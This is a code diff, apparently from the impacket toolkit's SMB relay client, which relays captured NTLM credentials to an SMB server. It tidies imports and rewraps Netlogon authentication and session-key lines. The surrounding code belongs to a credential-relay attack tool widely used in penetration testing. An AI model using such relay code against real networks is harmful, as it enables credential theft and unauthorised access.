@@ -13,8 +13,20 @@
 # Description:
 #  This is the SMB client which initiates the connection to an
 # SMB server and relays the credentials to this server.
-from impacket.smb import *
-from impacket.smbserver import *
+
+import logging
+from struct import pack, unpack
+from binascii import unhexlify, hexlify
+
+from impacket import smb, ntlm
+from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
+from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
+from impacket.dcerpc.v5 import transport, nrpc
+from impacket.dcerpc.v5.dtypes import NULL
+from impacket.smb import SMB, NewSMBPacket, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, \
+    SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, \
+    SMBSessionSetupAndX_Extended_Response_Parameters
+#from impacket.smbserver import *
 
 class SMBRelayClient(smb.SMB):
     def __init__(self, remote_name, extended_security = True, sess_port = 445):
@@ -92,7 +104,9 @@ class SMBRelayClient(smb.SMB):
 
         ppp = nrpc.ComputeNetlogonCredential('12345678', sessionKey)
 
-        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName+'\x00',ppp, 0x600FFFFF )
+        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00',
+                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName + '\x00',
+                                      ppp, 0x600FFFFF)
 
         clientStoredCredential = pack('<Q', unpack('<Q',ppp)[0] + 10)
 
@@ -131,11 +145,13 @@ class SMBRelayClient(smb.SMB):
             logging.error(str(e))
             return e.get_error_code()
 
-        logging.info("%s\\%s successfully validated through NETLOGON" % (domainName, authenticateMessage['user_name'].decode('utf-16le')))
- 
+        logging.info("%s\\%s successfully validated through NETLOGON" % (
+        domainName, authenticateMessage['user_name'].decode('utf-16le')))
+
         encryptedSessionKey = authenticateMessage['session_key']
         if encryptedSessionKey != '':
-            signingKey = ntlm.generateEncryptedSessionKey(resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
+            signingKey = ntlm.generateEncryptedSessionKey(
+                resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
         else:
             signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey'] 
 
